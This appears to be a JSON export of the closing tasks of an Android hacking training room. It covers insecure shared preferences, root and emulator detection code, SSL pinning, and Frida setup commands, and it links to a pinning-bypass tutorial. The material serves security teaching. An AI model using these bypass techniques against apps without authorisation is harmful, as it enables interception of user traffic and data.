66, 193)">name</span>=<span style="color:rgb(3, 47, 98)"><span>"</span>password<span>"</span></span>&gt;supersecret&lt;/<span style="color:rgb(34, 134, 58)">string</span>&gt;\n&lt;/<span style="color:rgb(34, 134, 58)">map</span>&gt;</pre></div><div><br /></div><div>Example in the real life:\xa0</div><div><br /></div><div><img src="https://1.bp.blogspot.com/-ft-7-Cc64BU/XbrxkMtrp6I/AAAAAAAAAUk/zUMZAkEqkbsySiWG70inJcU4zor5RLfggCLcBGAsYHQ/s1600/shared.png" style="width:967.988px" /><br /></div><div><br /></div>', 'taskType': 'none', 'taskNo': 8, 'taskCreated': '2019-10-29T22:27:40.254Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p>Read the above.</p>', 'hint': ''}]}, {'taskTitle': 'Dynamic Analysis – Complications', 'taskDesc': '<p style="text-align:center;"><img style="width:267.986px;" /></p><p style="text-align:left;"><b><span style="font-size:36px;">Root Detection in Android device:</span></b></p><p>My explanation for this is:<br /></p><p>if(device &amp;&amp; emulator = rooted):</p><p>\xa0\xa0\xa0 print "app going to the shit!"</p><p>else:</p><p>\xa0\xa0\xa0 print "app found" \xa0 <br /></p><p>So it is the best way to check in your application whether the device is rooted or not to avoid data theft but there’s no 100% way to check for root.</p><div><b>Check for Test-Keys</b>: Test-Keys has to do with how the kernel is signed when it is compiled. By default, stock Android ROMs from Google are built with release-keys tags. Test-Keys means it is signed with a custom key generated by a third-party developer. Specifically, it will check in build properties(“android.os.Build.TAGS”) for test-keys.</div><div><br /></div><div><span style="box-sizing:inherit;font-weight:700;font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;color:rgba(0, 0, 0, 0.84);letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">private boolean </span><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">detectTestKeys() {</span><br /><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">    String buildTags = android.os.Build.</span><span style="box-sizing:inherit;font-weight:700;font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;color:rgba(0, 0, 0, 0.84);letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);"><em>TAGS</em></span><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">;</span><br /><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">    </span><span style="box-sizing:inherit;font-weight:700;font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;color:rgba(0, 0, 0, 0.84);letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">return </span><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">buildTags != </span><span style="box-sizing:inherit;font-weight:700;font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;color:rgba(0, 0, 0, 0.84);letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">null </span><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">&amp;&amp; buildTags.contains(</span><span style="box-sizing:inherit;font-weight:700;font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;color:rgba(0, 0, 0, 0.84);letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">"test-keys"</span><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">);</span><br /><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">}</span></div><div><br /></div><div><b>Check for “su” binary</b>: Su binary check is to identify the superuser in the device. This binary is installed when you try to root your phone using apps like kinguser or via fastboot in Android. These files are necessary so that one can root their phone and become the superuser. The existence of this binary can be checked from the following paths.</div><div><br /></div><div><span style="box-sizing:inherit;font-weight:700;font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;color:rgba(0, 0, 0, 0.84);letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">private boolean </span><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">checkForSuBinary() {</span><br /><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">    </span><span style="box-sizing:inherit;font-weight:700;font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;color:rgba(0, 0, 0, 0.84);letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">return </span><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">checkForBinary(</span><span style="box-sizing:inherit;font-weight:700;font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;color:rgba(0, 0, 0, 0.84);letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">"su"</span><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">); </span><em>// function is available below<br /></em><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">}</span><br /></div><div><br /></div><div><b>Check for “busybox” binary:\xa0</b><span style="font-size:1rem;">If a device has been rooted, more often than not Busybox has been installed as well. Busybox is a binary that provides many common Linux commands. Running busybox is a good indication that a device has been rooted.</span></div><div><br /></div><div><span style="box-sizing:inherit;font-weight:700;font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;color:rgba(0, 0, 0, 0.84);letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">private boolean </span><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">checkForBusyBoxBinary() {</span><br /><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">   </span><span style="box-sizing:inherit;font-weight:700;font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;color:rgba(0, 0, 0, 0.84);letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">return </span><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">checkForBinary(</span><span style="box-sizing:inherit;font-weight:700;font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;color:rgba(0, 0, 0, 0.84);letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">"busybox"</span><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">);</span><em>//function is available below<br /></em><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">}</span></div><div><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);"><br /></span></div><div><span style="box-sizing:inherit;font-family:medium-content-serif-font, Georgia, Cambria, &quot;Times New Roman&quot;, Times, serif;font-weight:700;color:rgba(0, 0, 0, 0.84);font-size:21px;letter-spacing:-0.084px;">Check for SuExists:</span><span style="color:rgba(0, 0, 0, 0.84);font-family:medium-content-serif-font, Georgia, Cambria, &quot;Times New Roman&quot;, Times, serif;font-size:21px;letter-spacing:-0.084px;">\xa0different file system check for</span><span style="box-sizing:inherit;font-family:medium-content-serif-font, Georgia, Cambria, &quot;Times New Roman&quot;, Times, serif;font-weight:700;color:rgba(0, 0, 0, 0.84);font-size:21px;letter-spacing:-0.084px;">\xa0</span><span style="color:rgba(0, 0, 0, 0.84);font-family:medium-content-serif-font, Georgia, Cambria, &quot;Times New Roman&quot;, Times, serif;font-size:21px;letter-spacing:-0.084px;">the su binary.</span></div><div><span style="color:rgba(0, 0, 0, 0.84);font-family:medium-content-serif-font, Georgia, Cambria, &quot;Times New Roman&quot;, Times, serif;font-size:21px;letter-spacing:-0.084px;"><br /></span></div><div><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">private boolean checkSuExists() {</span><br /><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">    Process process = null;</span><br /><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">    try {</span><br /><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">        process = Runtime.</span><em>getRuntime</em><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">().exec(new String[]</span><br /><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">                {"/system /xbin/which", "su"});</span><br /><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">        BufferedReader in = new BufferedReader(</span><br /><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">                new InputStreamReader(process.getInputStream()));</span><br /><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">        String line = in.readLine();</span><br /><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">        process.destroy();</span><br /><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">        return line != null;</span><br /><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">    } catch (Exception e) {</span><br /><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">        if (process != null) {</span><br /><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">            process.destroy();</span><br /><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">        }</span><br /><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">        return false;</span><br /><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">    }</span><br /><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">}</span><span style="color:rgba(0, 0, 0, 0.84);font-family:medium-content-serif-font, Georgia, Cambria, &quot;Times New Roman&quot;, Times, serif;font-size:21px;letter-spacing:-0.084px;"><br /></span><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);"><br /></span></div><div><span style="color:rgba(0, 0, 0, 0.84);font-family:medium-content-serif-font, Georgia, Cambria, &quot;Times New Roman&quot;, Times, serif;font-size:21px;letter-spacing:-0.084px;">The following\xa0</span><span style="box-sizing:inherit;font-family:medium-content-serif-font, Georgia, Cambria, &quot;Times New Roman&quot;, Times, serif;font-weight:700;color:rgba(0, 0, 0, 0.84);font-size:21px;letter-spacing:-0.084px;">paths</span><span style="color:rgba(0, 0, 0, 0.84);font-family:medium-content-serif-font, Georgia, Cambria, &quot;Times New Roman&quot;, Times, serif;font-size:21px;letter-spacing:-0.084px;">, Su and busybox binaries are often looked for</span><span style="box-sizing:inherit;font-family:medium-content-serif-font, Georgia, Cambria, &quot;Times New Roman&quot;, Times, serif;font-weight:700;color:rgba(0, 0, 0, 0.84);font-size:21px;letter-spacing:-0.084px;">\xa0</span><span style="color:rgba(0, 0, 0, 0.84);font-family:medium-content-serif-font, Georgia, Cambria, &quot;Times New Roman&quot;, Times, serif;font-size:21px;letter-spacing:-0.084px;">on rooted devices.</span></div><div><span style="color:rgba(0, 0, 0, 0.84);font-family:medium-content-serif-font, Georgia, Cambria, &quot;Times New Roman&quot;, Times, serif;font-size:21px;letter-spacing:-0.084px;"><br /></span></div><div><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">private String[] binaryPaths= {</span><br /><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">        "/data/local/",</span><br /><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">        "/data/local/bin/",</span><br /><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">        "/data/local/xbin/",</span><br /><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">        "/sbin/",</span><br /><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">        "/su/bin/",</span><br /><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">        "/system/bin/",</span><br /><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">        "/system/bin/.ext/",</span><br /><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">        "/system/bin/failsafe/",</span><br /><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">        "/system/sd/xbin/",</span><br /><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">        "/system/usr/we-need-root/",</span><br /><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">        "/system/xbin/",</span><br /><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">        "/system/app/Superuser.apk",</span><br /><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">        "/cache",</span><br /><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">        "/data",</span><br /><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">        "/dev"</span><br /><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);">};</span><span style="color:rgba(0, 0, 0, 0.84);font-family:medium-content-serif-font, Georgia, Cambria, &quot;Times New Roman&quot;, Times, serif;font-size:21px;letter-spacing:-0.084px;"><br /></span><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);"><br /></span></div><div><span style="font-weight:bolder;"><span style="font-size:36px;">Emulator Detection:</span></span><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);"><br /></span></div><div><p><span style="font-size:1rem;">My explanation for this is:</span><br /></p><p>if(isEmulator):</p><p>\xa0\xa0\xa0 print "app going to the shit!"</p><p>else:</p><p style="margin-bottom:1rem;">\xa0\xa0\xa0 print "app found"\xa0</p></div><div><span style="font-family:Verdana;">First you need to check the the pre-decompiled source code and check for functions that contains strings like “generic | emulator | google_sdk” and functions like “isEmulator | emulatorDetection…etc” … use your searching skills and read the code well</span></div><div><br /></div><div><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/d27618ec897f6d24c32dc3b61ddd5d2cb8232aa9.png" style="width:882.988px;" /></div><div><br /></div><div><img src="https://www.juanurs.com/img/featured/antiemu/AntiEmu-12-cuadro.png" style="width:1046.02px;" /></div><div><br /></div><div><b><span style="font-size:36px;">SSL Pinning</span><span style="font-size:36px;">:</span></b><span style="font-size:36px;font-weight:700;">\xa0</span></div><div><span style="font-size:14px;"><br /></span></div><div><span style="font-size:16px;font-family:Verdana;">Is a technique that we use in the client side to avoid man-in-the-middle attack by validating the server certificates again even after SSL handshaking. The developers embed (or pin) a list of trustful certificates to the client application during development, and use them to compare against the server certificates during runtime. If there is a mismatch between the server and the local copy of certificates, the connection will simply be disrupted, and no further user data will be even sent to that server. This enforcement ensures that the user devices are communicating only to the dedicated trustful servers.</span></div><div><span style="font-size:14px;"><br /></span></div><div><span style="font-size:14px;"><br /></span><img src="https://miro.medium.com/max/690/1*4tNQjDgUjldOxZ2CZ9_i2A.png" style="width:690px;" /></div><div><br /></div><div>After you have taken in the illustration above, note that certificate pinning attempts to ensure that the client is not exchanging messages with any other server than the one they hold a public key for. Therefore, the client is not exposed to attacks where a rogue Certificate Authority (CA) validates the authenticity of a malicious host serving content with a sham certificate.</div><div><br /></div><div>if(devices &amp;&amp; emulators = CA_BURPSUITE):</div><div>\xa0 \xa0 print "not intercept comunications ):"</div><div>else:</div><div>\xa0 \xa0 print "App found"<br /></div>', 'taskType': 'none', 'taskNo': 9, 'taskCreated': '2019-10-29T22:35:59.881Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p><br /></p>', 'hint': ''}]}, {'taskTitle': 'Bypass - Complications in Dynamic Analysis ', 'taskDesc': '<p><span style="color:rgba(0, 0, 0, 0.75);font-family:Verdana;font-size:20px;"><b>Hooking applications</b>: </span></p><p><span style="color:rgba(0, 0, 0, 0.75);font-family:Verdana;font-size:20px;">Techniques used to alter the behaviour of applications.\xa0</span></p><p><b><span style="font-family:Verdana;">Frida</span></b></p><p><span style="font-family:Verdana;">In short, it is a dynamic instrumentation framework, which enables function hooking and allows to provide a definition to it during runtime. Basically, it injects JavaScript code into a process. Suppose, there is a function called “foo” in a program with a specific body/implementation. Using “Frida”, one can change the body/implementation of the “foo” function during runtime. “Frida” supports a variety of platforms like Windows, macOS, GNU/Linux, iOS, Android, and QNX. More information on “Frida” can be found </span><a href="https://www.frida.re/docs/home/"><span style="font-family:Verdana;">here</span></a><span style="font-family:Verdana;">.</span></p><p>for install\xa0</p><p><code>pip install frida-tools</code><span style="color:rgb(255, 255, 255);font-family:Menlo, Consolas, &quot;Courier New&quot;, Courier, &quot;Liberation Mono&quot;, monospace;white-space:pre;background-color:rgba(0, 0, 0, 0.7);"></span><br /></p><p>Now check version and download the server, in my case is 12.6.8</p><p><code>frida --version</code></p><p>unzip file and push the server in the local system /data/local/tmp</p><p><code>adb push /path/serverfrida\xa0/data/local/tmp</code></p><p><span style="font-size:1rem;">Permissions</span></p><p><code>adb shell chmod 777 /data/local/tmp/frida-server</code><span style="color:rgba(0, 0, 0, 0.84);font-family:Menlo, Monaco, &quot;Courier New&quot;, Courier, monospace;letter-spacing:-0.352px;white-space:pre-wrap;background-color:rgba(0, 0, 0, 0.05);"></span><span style="font-size:1rem;"><br /></span></p><p>run frida server</p><p><span style="color:rgb(196, 20, 20);font-family:SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;white-space:pre;background-color:rgb(234, 234, 237);">adb shell /data/local/tmp/frida-servername&amp;</span><br /></p><p>now execute in your command line <b>frida-ps -U</b></p><p><b><span style="font-size:24px;"><a href="https://medium.com/@ved_wayal/hail-frida-the-universal-ssl-pinning-bypass-for-android-e9e1d733d29">Bypass SSL pinning tutorial</a></span></b></p><p>More hooks :v is your mision :33\xa0</p>', 'taskType': 'none', 'taskNo': 10, 'taskCreated': '2019-10-30T17:23:06.128Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p><br /></p>', 'hint': ''}]}, {'taskTitle': 'Final', 'taskDesc': '<p style="text-align:center;"><img src="https://thegamingeek.com/wp-content/uploads/2019/03/Thank-you-for-reading-The-Gaming-Geek.jpg" style="width:845.258px;height:250.598px;" /><br /></p><p>This is a basic introduction to what is android hacking.\xa0Applications in CTFs are much more difficult than a real-life application.</p><p>Questions?\xa0</p><p>In discord: stuxnet, in twitter: _stuxnet, telelegram: stuxnet</p><p>You want to know more?\xa0</p><p>Check this</p><p><a href="https://www.owasp.org/index.php/Mobile_Top_10_2016-Top_10">Owasp Mobile Top 10\xa0</a></p><p><a href="https://www.owasp.org/index.php/OWASP_Mobile_Security_Testing_Guide">Mobile Security Testing Guide (MSTG)</a></p><p><a href="https://twitter.com/mobilesecurity">Mobile Security Twitter</a><br /></p><p>See you in other occasion! good luck hacker\xa0</p><p>Try Harder!\xa0</p>', 'taskType': 'none', 'taskNo': 11, 'taskCreated': '2019-10-30T17:41:10.123Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p><br /></p>', 'hint': ''}]}]}